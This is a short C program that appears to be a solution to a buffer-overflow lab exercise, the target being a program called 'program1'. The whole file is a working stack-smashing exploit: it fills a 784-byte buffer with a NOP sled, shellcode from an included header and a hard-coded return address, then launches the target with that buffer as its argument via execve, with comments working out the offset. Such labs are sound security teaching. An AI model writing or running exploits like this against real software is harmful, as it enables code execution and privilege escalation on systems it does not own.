#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define PROGRAM "/..//program1"

int main(void)
{
  char *args[3];
  char *environ[1];
  char buff[784];
  int i;

  args[0] = PROGRAM;

  // print (0xbffffb3c-0xbffff830) is 780, so you need a buffer of 784

  for(i=0;i<(780-strlen(shellcode));i++)
    buff[i] = 0x90;

  strncpy(buff+(780-strlen(shellcode)), shellcode, strlen(shellcode));
  
  buff[780] = 0x50;
  buff[781] = 0xf8;
  buff[782] = 0xff;
  buff[783] = 0xbf;

  printf("%s\n", buff);
  //0xbffff840 (a bit more than that)

  args[1] = buff;
  args[2] = NULL;
  environ[0] = NULL;

  if (0 > execve(PROGRAM, args, environ))
    fprintf(stderr, "call to execve failed.\n");

  return 0;
}
